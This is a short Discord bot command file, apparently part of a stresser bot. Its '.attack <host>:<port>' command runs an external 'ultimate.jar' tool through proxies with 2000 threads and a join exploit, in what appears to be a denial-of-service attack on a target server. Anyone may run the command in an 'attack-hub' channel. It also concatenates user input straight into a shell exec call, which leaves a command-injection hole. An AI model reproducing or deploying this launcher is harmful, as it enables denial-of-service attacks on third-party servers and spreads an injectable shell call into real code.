const Discord = require("discord.js");


exports.run = async (client, message, args) => {


  if(message.channel.name == "〔💣〕attack-hub"){

const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
const proxy = args.join(" ").slice(2)

if(!port)
return message.channel.send("〔💥〕Usage: .attack <host>:<port>")

if(!host)
return message.channel.send("〔💥〕Usage: .attack <host>:<port>")

var exec = require('child_process').exec



exec('java -jar ultimate.jar host=' + host + ' port=' + port + ' proxiesFile=socks4.txt threads=2000 attackTime=20 exploit=join', (error, stdout, stderr) => {
});

 message.channel.send("〔💥〕Starting attack...");
  message.channel.send("〔💥〕Attack sent to **" + host + "**" + " with **" + port +"** port!");
  } else {
        message.channel.send("〔💥〕You cannot run that here")

  }


  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['attack'],
  permLevel: 0
}

exports.help = {
  name: 'attack',
  description: 'BigPayload',
  usage: 'attack'
}